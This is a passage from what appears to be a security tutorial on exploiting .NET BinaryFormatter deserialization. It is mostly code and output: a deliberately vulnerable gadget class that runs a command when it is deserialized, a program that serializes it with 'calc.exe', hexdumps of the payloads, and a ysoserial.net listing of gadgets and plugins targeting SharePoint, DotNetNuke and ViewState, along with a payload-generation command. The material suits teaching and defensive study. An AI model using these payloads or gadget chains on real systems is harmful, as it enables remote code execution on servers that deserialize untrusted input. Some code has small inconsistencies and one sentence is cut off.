        <span class="k">private</span> <span class="k">void</span> <span class="nf">run</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
            <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
            <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
            <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Run</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="na">    [Serializable]</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">Desert</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="n">String</span> <span class="n">_name</span><span class="p">;</span>

        <span class="k">public</span> <span class="n">String</span> <span class="n">name</span>
        <span class="p">{</span>
            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_name</span><span class="p">;</span> <span class="p">}</span>
            <span class="k">set</span> <span class="p">{</span> <span class="n">_name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Desert name: &quot;</span> <span class="p">+</span> <span class="n">_name</span><span class="p">);</span> <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>If we run the serializer, the following object would be created:</p>
<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 49 42  61 73 69 63 58 4d 4c 53  |......IBasicXMLS|
00000020  65 72 69 61 6c 69 7a 65  72 2c 20 56 65 72 73 69  |erializer, Versi|
00000030  6f 6e 3d 31 2e 30 2e 30  2e 30 2c 20 43 75 6c 74  |on=1.0.0.0, Cult|
00000040  75 72 65 3d 6e 65 75 74  72 61 6c 2c 20 50 75 62  |ure=neutral, Pub|
00000050  6c 69 63 4b 65 79 54 6f  6b 65 6e 3d 6e 75 6c 6c  |licKeyToken=null|
00000060  05 01 00 00 00 1a 42 69  6e 61 72 79 53 65 72 69  |......BinarySeri|
00000070  61 6c 69 7a 61 74 69 6f  6e 2e 44 65 73 65 72 74  |alization.Desert|
00000080  01 00 00 00 05 5f 6e 61  6d 65 01 02 00 00 00 06  |....._name......|
00000090  03 00 00 00 04 47 6f 62  69 0b                    |.....Gobi.|
0000009a
</pre></div>

<p>The first 17 bytes are the header of the deserialized object, which consists of:</p>
<ul>
<li>RecordTypeEnum (1 byte)</li>
<li>RootId (4 bytes)</li>
<li>HeaderId (4 bytes)</li>
<li>MajorVersion (4 bytes)</li>
<li>MinorVersion (4 bytes)</li>
</ul>
<p>How we can exploit this kind of behaviour then?</p>
<p>Well, the approach is very similar to the one applied to JAVA, and consists to trick the application into loading an arbitrary object, that could allow us to gain code execution capabilities. In order to do it, we should find a suitable class, which, if you remember, should have at least the following properties (NW: it&rsquo;s not a formal definition):</p>
<ul>
<li>Serializable</li>
<li>Holding public/settable variables</li>
<li>Implementing magic &ldquo;functions&rdquo; (we&rsquo;ll see an example below), like:<ul>
<li>Get/Set</li>
<li>OnSerialisation</li>
<li>Constructors/Destructors</li>
</ul>
</li>
</ul>
<p>Now, if you take a deeper look at the code above, you&rsquo;ll find this class:</p>
<div class="codehilite"><pre><span class="na"> [Serializable]</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
    <span class="p">{</span>
        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">set</span>
        <span class="p">{</span>
            <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
            <span class="n">Run</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Run</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>This class seems suitable for our needs, it can be considered as it&rsquo;s a valid <strong>Gadget</strong>, as even alone it can allow us to reach remote code execution. In order to achieve it, it would be enough for an attacker to serialize the RCE class giving a valid command to execute: </p>
<div class="codehilite"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
<span class="k">using</span>
<span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">namespace</span> <span class="nn">BinarySerialization</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">BinarySerialization</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">&quot;desert.ser&quot;</span><span class="p">;</span>
<span class="na">        [STAThread]</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
            <span class="c1">// Delete old file, if it exists</span>
            <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="c1">// Serialize RCE</span>
            <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertSerial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="c1">// Wait for Enter</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Press Enter Key&quot;</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">deleteFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filname</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deleting old file&quot;</span><span class="p">);</span>
                <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>     

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertSerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// Create desert name</span>
            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
            <span class="n">desert</span><span class="p">.</span><span class="n">cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
            <span class="c1">// Persist to file</span>
            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert (RCE)&quot;</span><span class="p">);</span>
            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">desert</span><span class="p">);</span>
            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="p">}</span>

    <span class="p">}</span>

<span class="na">    [Serializable]</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
        <span class="p">{</span>
            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
            <span class="k">set</span>
            <span class="p">{</span>
                <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
                <span class="c1">//run(); Disabled to avoid spawning a calc while serializing </span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">private</span> <span class="k">void</span> <span class="nf">run</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
            <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
            <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
            <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Run</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>Serializing that would produce the following file:</p>
<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 47 42  69 6e 61 72 79 53 65 72  |......GBinarySer|
00000020  69 6c 69 61 7a 65 72 2c  20 56 65 72 73 69 6f 6e  |iliazer, Version|
00000030  3d 30 2e 30 2e 30 2e 30  2c 20 43 75 6c 74 75 72  |=0.0.0.0, Cultur|
00000040  65 3d 6e 65 75 74 72 61  6c 2c 20 50 75 62 6c 69  |e=neutral, Publi|
00000050  63 4b 65 79 54 6f 6b 65  6e 3d 6e 75 6c 6c 05 01  |cKeyToken=null..|
00000060  00 00 00 17 42 69 6e 61  72 79 53 65 72 69 61 6c  |....BinarySerial|
00000070  69 7a 61 74 69 6f 6e 2e  52 43 45 01 00 00 00 04  |ization.RCE.....|
00000080  5f 63 6d 64 01 02 00 00  00 06 03 00 00 00 08 63  |_cmd...........c|
00000090  61 6c 63 2e 65 78 65 0b                           |alc.exe.|
00000098
</pre></div>

<p>Once deserialized by the application, it would automatically spawn a calculator on the application hosting server.</p>
<p>There are many other types of classes that can be abused, like classing using Delegate or </p>
<p>So, the above pieces of code are trivial examples on how the exploitation process works. The next question would be, could it be possible to exploit it without relying on the Damn Vulnerable RCE class? The answer is yes, and it&rsquo;s provided, similarly to JAVA, by means of <strong>POP gadgets</strong>. </p>
<p>The only exception being that each formatter holds its own exploitation methodology and its gadgets. Practically each formatter has visibility only to certain objects types, so not every gadget can be used with a specific formatter (We&rsquo;ll see a manual example of that later on in this document).</p>
<p>During the years, <strong>ysoserial.net</strong> was created, which allows to generate automatically serialized payloads using known .NET gadgets. The tool is available <a href="https://github.com/pwntester/ysoserial.net/">here</a></p>
<div class="codehilite"><pre>ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Available formatters:
        ActivitySurrogateDisableTypeCheck (ActivitySurrogateDisableTypeCheck Gadget by Nick Landers. Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ObjectDataProvider (ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz)
                Formatters:
                        Xaml
                        Json.Net
                        FastJson
                        JavaScriptSerializer
                        XmlSerializer
                        DataContractSerializer
                        YamlDotNet &lt; 5.0.0
        TextFormattingRunProperties (TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegate (TypeConfuseDelegate gadget by James Forshaw)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegateMono (TypeConfuseDelegate gadget by James Forshaw - Tweaked to work with Mono)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        WindowsIdentity (WindowsIdentity Gadget by Levi Broderick)
                Formatters:
                        BinaryFormatter
                        Json.Net
                        DataContractSerializer
                        SoapFormatter

Available plugins:
        ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
        Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
        ApplicationTrust (Generates XML payload for the ApplicationTrust class)
        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
        DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
        Resx (Generates RESX files)
        SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
        SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2019-0604, CVE-2018-8421)
        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
        ViewState (Generates a ViewState using known MachineKey parameters)
</pre></div>

<p>A valid payload for the example deserializer can be generated via the following command:</p>
<div class="codehilite"><pre>$ ysoserial-net -f BinaryFormatter -g TypeConfuseDelegate -o raw -c calc.exe &gt; desert.ser
</pre></div>

<p>The following object would be created:</p>
<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 49 53  79 73 74 65 6d 2c 20 56  |......ISystem, V|
00000020  65 72 73 69 6f 6e 3d 34  2e 30 2e 30 2e 30 2c 20  |ersion=4.0.0.0, |
00000030  43 75 6c 74 75 72 65 3d  6e 65 75 74 72 61 6c 2c  |Culture=neutral,|
00000040  20 50 75 62 6c 69 63 4b  65 79 54 6f 6b 65 6e 3d  | PublicKeyToken=|
00000050  62 37 37 61 35 63 35 36  31 39 33 34 65 30 38 39  |b77a5c561934e089|
00000060  05 01 00 00 00 84 01 53  79 73 74 65 6d 2e 43 6f  |.......System.Co|
00000070  6c 6c 65 63 74 69 6f 6e  73 2e 47 65 6e 65 72 69  |llections.Generi|
00000080  63 2e 53 6f 72 74 65 64  53 65 74 60 31 5b 5b 53  |c.SortedSet`1[[S|
00000090  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
000000a0  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
000000b0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
000000c0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
000000d0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
000000e0  36 31 39 33 34 65 30 38  39 5d 5d 04 00 00 00 05  |61934e089]].....|
000000f0  43 6f 75 6e 74 08 43 6f  6d 70 61 72 65 72 07 56  |Count.Comparer.V|
00000100  65 72 73 69 6f 6e 05 49  74 65 6d 73 00 03 00 06  |ersion.Items....|
00000110  08 8d 01 53 79 73 74 65  6d 2e 43 6f 6c 6c 65 63  |...System.Collec|
00000120  74 69 6f 6e 73 2e 47 65  6e 65 72 69 63 2e 43 6f  |tions.Generic.Co|
00000130  6d 70 61 72 69 73 6f 6e  43 6f 6d 70 61 72 65 72  |mparisonComparer|
00000140  60 31 5b 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |`1[[System.Strin|
00000150  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
00000160  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
00000170  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
00000180  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
00000190  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 5d  |7a5c561934e089]]|
000001a0  08 02 00 00 00 02 00 00  00 09 03 00 00 00 02 00  |................|
000001b0  00 00 09 04 00 00 00 04  03 00 00 00 8d 01 53 79  |..............Sy|
000001c0  73 74 65 6d 2e 43 6f 6c  6c 65 63 74 69 6f 6e 73  |stem.Collections|
000001d0  2e 47 65 6e 65 72 69 63  2e 43 6f 6d 70 61 72 69  |.Generic.Compari|
000001e0  73 6f 6e 43 6f 6d 70 61  72 65 72 60 31 5b 5b 53  |sonComparer`1[[S|
000001f0  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
00000200  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
00000210  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
00000220  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
00000230  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
00000240  36 31 39 33 34 65 30 38  39 5d 5d 01 00 00 00 0b  |61934e089]].....|
00000250  5f 63 6f 6d 70 61 72 69  73 6f 6e 03 22 53 79 73  |_comparison.&quot;Sys|
00000260  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
00000270  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 09  |alizationHolder.|
00000280  05 00 00 00 11 04 00 00  00 02 00 00 00 06 06 00  |................|
00000290  00 00 0b 2f 63 20 63 61  6c 63 2e 65 78 65 06 07  |.../c calc.exe..|
000002a0  00 00 00 03 63 6d 64 04  05 00 00 00 22 53 79 73  |....cmd.....&quot;Sys|
000002b0  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
000002c0  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 03  |alizationHolder.|
000002d0  00 00 00 08 44 65 6c 65  67 61 74 65 07 6d 65 74  |....Delegate.met|
000002e0  68 6f 64 30 07 6d 65 74  68 6f 64 31 03 03 03 30  |hod0.method1...0|
000002f0  53 79 73 74 65 6d 2e 44  65 6c 65 67 61 74 65 53  |System.DelegateS|
00000300  65 72 69 61 6c 69 7a 61  74 69 6f 6e 48 6f 6c 64  |erializationHold|
00000310  65 72 2b 44 65 6c 65 67  61 74 65 45 6e 74 72 79  |er+DelegateEntry|
00000320  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
00000330  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
00000340  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
00000350  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
00000360  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
00000370  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
00000380  09 08 00 00 00 09 09 00  00 00 09 0a 00 00 00 04  |................|
00000390  08 00 00 00 30 53 79 73  74 65 6d 2e 44 65 6c 65  |....0System.Dele|
000003a0  67 61 74 65 53 65 72 69  61 6c 69 7a 61 74 69 6f  |gateSerializatio|
000003b0  6e 48 6f 6c 64 65 72 2b  44 65 6c 65 67 61 74 65  |nHolder+Delegate|
000003c0  45 6e 74 72 79 07 00 00  00 04 74 79 70 65 08 61  |Entry.....type.a|
000003d0  73 73 65 6d 62 6c 79 06  74 61 72 67 65 74 12 74  |ssembly.target.t|
000003e0  61 72 67 65 74 54 79 70  65 41 73 73 65 6d 62 6c  |argetTypeAssembl|
000003f0  79 0e 74 61 72 67 65 74  54 79 70 65 4e 61 6d 65  |y.targetTypeName|
00000400  0a 6d 65 74 68 6f 64 4e  61 6d 65 0d 64 65 6c 65  |.methodName.dele|
00000410  67 61 74 65 45 6e 74 72  79 01 01 02 01 01 01 03  |gateEntry.......|
00000420  30 53 79 73 74 65 6d 2e  44 65 6c 65 67 61 74 65  |0System.Delegate|
00000430  53 65 72 69 61 6c 69 7a  61 74 69 6f 6e 48 6f 6c  |SerializationHol|
00000440  64 65 72 2b 44 65 6c 65  67 61 74 65 45 6e 74 72  |der+DelegateEntr|
00000450  79 06 0b 00 00 00 b0 02  53 79 73 74 65 6d 2e 46  |y.......System.F|
00000460  75 6e 63 60 33 5b 5b 53  79 73 74 65 6d 2e 53 74  |unc`3[[System.St|
00000470  72 69 6e 67 2c 20 6d 73  63 6f 72 6c 69 62 2c 20  |ring, mscorlib, |
00000480  56 65 72 73 69 6f 6e 3d  34 2e 30 2e 30 2e 30 2c  |Version=4.0.0.0,|
00000490  20 43 75 6c 74 75 72 65  3d 6e 65 75 74 72 61 6c  | Culture=neutral|
000004a0  2c 20 50 75 62 6c 69 63  4b 65 79 54 6f 6b 65 6e  |, PublicKeyToken|
000004b0  3d 62 37 37 61 35 63 35  36 31 39 33 34 65 30 38  |=b77a5c561934e08|
000004c0  39 5d 2c 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |9],[System.Strin|
000004d0  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
000004e0  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
000004f0  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
00000500  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
00000510  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 2c  |7a5c561934e089],|
00000520  5b 53 79 73 74 65 6d 2e  44 69 61 67 6e 6f 73 74  |[System.Diagnost|
00000530  69 63 73 2e 50 72 6f 63  65 73 73 2c 20 53 79 73  |ics.Process, Sys|
00000540  74 65 6d 2c 20 56 65 72  73 69 6f 6e 3d 34 2e 30  |tem, Version=4.0|
00000550  2e 30 2e 30 2c 20 43 75  6c 74 75 72 65 3d 6e 65  |.0.0, Culture=ne|
00000560  75 74 72 61 6c 2c 20 50  75 62 6c 69 63 4b 65 79  |utral, PublicKey|
00000570  54 6f 6b 65 6e 3d 62 37  37 61 35 63 35 36 31 39  |Token=b77a5c5619|
00000580  33 34 65 30 38 39 5d 5d  06 0c 00 00 00 4b 6d 73  |34e089]].....Kms|
00000590  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
000005a0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
000005b0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
000005c0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
000005d0  36 31 39 33 34 65 30 38  39 0a 06 0d 00 00 00 49  |61934e089......I|
000005e0  53 79 73 74 65 6d 2c 20  56 65 72 73 69 6f 6e 3d  |System, Version=|
000005f0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
00000600  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
00000610  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
00000620  36 31 39 33 34 65 30 38  39 06 0e 00 00 00 1a 53  |61934e089......S|
00000630  79 73 74 65 6d 2e 44 69  61 67 6e 6f 73 74 69 63  |ystem.Diagnostic|
00000640  73 2e 50 72 6f 63 65 73  73 06 0f 00 00 00 05 53  |s.Process......S|
00000650  74 61 72 74 09 10 00 00  00 04 09 00 00 00 2f 53  |tart........../S|
00000660  79 73 74 65 6d 2e 52 65  66 6c 65 63 74 69 6f 6e  |ystem.Reflection|
00000670  2e 4d 65 6d 62 65 72 49  6e 66 6f 53 65 72 69 61  |.MemberInfoSeria|
00000680  6c 69 7a 61 74 69 6f 6e  48 6f 6c 64 65 72 07 00  |lizationHolder..|
00000690  00 00 04 4e 61 6d 65 0c  41 73 73 65 6d 62 6c 79  |...Name.Assembly|
000006a0  4e 61 6d 65 09 43 6c 61  73 73 4e 61 6d 65 09 53  |Name.ClassName.S|
000006b0  69 67 6e 61 74 75 72 65  0a 53 69 67 6e 61 74 75  |ignature.Signatu|
000006c0  72 65 32 0a 4d 65 6d 62  65 72 54 79 70 65 10 47  |re2.MemberType.G|
000006d0  65 6e 65 72 69 63 41 72  67 75 6d 65 6e 74 73 01  |enericArguments.|
000006e0  01 01 01 01 00 03 08 0d  53 79 73 74 65 6d 2e 54  |........System.T|
000006f0  79 70 65 5b 5d 09 0f 00  00 00 09 0d 00 00 00 09  |ype[]...........|
00000700  0e 00 00 00 06 14 00 00  00 3e 53 79 73 74 65 6d  |.........&gt;System|
00000710  2e 44 69 61 67 6e 6f 73  74 69 63 73 2e 50 72 6f  |.Diagnostics.Pro|
00000720  63 65 73 73 20 53 74 61  72 74 28 53 79 73 74 65  |cess Start(Syste|
00000730  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
00000740  2e 53 74 72 69 6e 67 29  06 15 00 00 00 3e 53 79  |.String).....&gt;Sy|
00000750  73 74 65 6d 2e 44 69 61  67 6e 6f 73 74 69 63 73  |stem.Diagnostics|
00000760  2e 50 72 6f 63 65 73 73  20 53 74 61 72 74 28 53  |.Process Start(S|
00000770  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 53 79  |ystem.String, Sy|
00000780  73 74 65 6d 2e 53 74 72  69 6e 67 29 08 00 00 00  |stem.String)....|
00000790  0a 01 0a 00 00 00 09 00  00 00 06 16 00 00 00 07  |................|
000007a0  43 6f 6d 70 61 72 65 09  0c 00 00 00 06 18 00 00  |Compare.........|
000007b0  00 0d 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 06  |..System.String.|
000007c0  19 00 00 00 2b 49 6e 74  33 32 20 43 6f 6d 70 61  |....+Int32 Compa|
000007d0  72 65 28 53 79 73 74 65  6d 2e 53 74 72 69 6e 67  |re(System.String|
000007e0  2c 20 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 29  |, System.String)|
000007f0  06 1a 00 00 00 32 53 79  73 74 65 6d 2e 49 6e 74  |.....2System.Int|
00000800  33 32 20 43 6f 6d 70 61  72 65 28 53 79 73 74 65  |32 Compare(Syste|
00000810  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
